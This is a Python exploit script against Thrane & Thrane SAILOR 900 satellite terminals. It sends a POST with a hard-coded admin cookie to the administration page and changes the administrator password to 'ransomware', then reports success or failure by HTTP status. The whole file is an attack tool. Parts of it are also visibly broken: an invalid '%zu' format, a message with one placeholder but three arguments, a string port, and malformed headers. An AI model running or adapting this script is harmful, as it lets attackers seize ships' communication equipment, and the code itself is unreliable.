import itertools
import os
import socket
import sys

template = b"""POST %s HTTP/1.0\n\n
Host: %s\r\n
Content-type: application/x-www-form-urlencoded\r\n
Content-length: %zu \r\n
Cookie: tt_adm=694020\r\n
%s \r\n\n"""

BUFFER_MAX_SIZE = 65535

RESPONSES = {

    b"404": "[x] Exploit Failed Ref. RFC 2616, 10.4.5 - False Positive HTTP ERROR [404] Host is not a V-SAT Sailor 900 terminal.",
    b"401": "[x] Exploit Failed Ref. RFC 2616, 10.4.2 - HTTP Unauthorized [401] Unauthorized Access to remote host. ",
    b"500": "[x] Exploit Failed Ref. RFC 2616, 10.5.1 - HTTP Internal Server Error [500] Internal Server Error - The remote host couldn't recognise the request. This is not a valid SAILOR 900 terminal.",
    b"303": "[x] Exploit Failed Ref. RFC 2616, 10.3.4 - HTTP See Other [303] Possible Redirect - The code received says it is temporary under a different URL. This is not a valid SAILOR 900 terminal.",
    b"307": "[x] Exploit Failed Ref. RFC 2616, 10.3.8 - HTTP Temporary Redirect [307] Possible Redirect - The requested resource received indicates redirection. This is not a valid SAILOR 900 terminal.",
    b"403": "[x] Exploit Failed Ref. RFC 2616, 10.4.4 - HTTP Forbidden [403] The remote server/ understood the request, but is refusing to fulfill it.",
    b"407": "[x] Exploit Failed Ref. RFC 2616, 10.4.8 - HTTP Proxy Authentication Required [407] - The remote terminal requires HTTP authentication. If this is a valid SAILOR 900 terminal, it is protected with HTTP authentication.",
    b"408": "[x] Exploit Failed Ref. RFC 2616, 10.4.9 - HTTP Request Time out [408] - The client did not produce a request within the time that the server was prepared to wait.",
    b"503": "[x] Exploit Failed Ref. RFC 2616, 10.5.4 - HTTP Service Unavailable [503] - Connection Refused. The hostname of the terminal provided is currently unable to handle the request.",
    b"411": "[x] Exploit Failed Ref. RFC 2616 - Error 411 - Length Required. This is not a valid SAILOR 900 terminal.",
    b"400": "[x] Exploit Failed Ref. RFC 2616 - Error 400 - Bad Request. This is not a valid SAILOR 900 terminal. The request could not be understood by the remote server.",
    b"301": "[x] Exploit Failed Ref. RFC 2616 - Error 301 - Moved Permanently. This is not a valid SAILOR 900 terminal. The request could not be understood by the remote server.",
    b"BAD REQUEST": "[x] Exploit Failed. This is not a valid SAILOR 900 terminal.",
}


def send_payload(s, template, host, port, path, payload):
    s.connect((host, port))
    s.sendall(template % (path, host, len(payload), payload))


def check_response(s, old_password, password):
    response = s.recv(BUFFER_MAX_SIZE)

    items = list(RESPONSES.keys())
    errors = list(map(lambda key: key in response, items))

    if any(errors):
        keys = itertools.compress(items, errors)
        for key in keys:
            print(RESPONSES.get(key), file=sys.stderr)
        return os.EX_SOFTWARE

    if not b"Thrane & Thrane" in response:
        print("[x] Exploit Failed. This is not a valid SAILOR 900 terminal...", file=sys.stderr)
        return os.EX_SOFTWARE

    if b"Thrane & Thrane" in response and b"302" not in response:
        # P4WNED
        print(
            "[x] Mission Successful  Ref. RFC 2616, 10.2.3 - HTTP Okay  [202] The remote host is a V-SAT Sailor 900. Please Login as administrator: user:admin & pass:aisatpwn2134 on %s" %
            (old_password, password, host)
        )
        return os.EX_OK

    return os.EX_SOFTWARE


host = input("Enter host...")
port = input("Enter port...") or 1880
path = input("Enter path...") or "/index.lua?pageID=administration"
change_pw = lambda old_password="admin", \
                   password="ransomware": f"&usernameAdmChange={old_password}&passwordAdmChange={password}"
old_password = "admin"
password = "ransomware"

if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exit_code = os.EX_SOFTWARE
    try:
        send_payload(s, template, host, port, path, change_pw())
        exit_code = check_response(s, old_password, password)
    finally:
        s.close()
        sys.exit(exit_code)
